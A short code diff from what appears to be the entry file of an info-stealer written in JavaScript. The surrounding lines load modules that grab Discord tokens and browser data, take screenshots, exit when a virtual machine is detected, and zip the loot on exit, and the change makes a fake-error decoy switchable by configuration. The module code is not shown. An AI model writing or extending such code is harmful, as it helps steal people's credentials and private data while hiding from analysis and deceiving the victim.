@@ -24,7 +24,7 @@ if (checkVM() && config.exitIfVm) {
   require('./functions/grab-discord-token');
   require('./functions/grab-browsers-data');
   require('./functions/screenshot');
-  // require('./functions/fake-error');
+  config.fakeError && require('./functions/fake-error');
 
   process.on('beforeExit', () => require('./functions/zip'));
 }
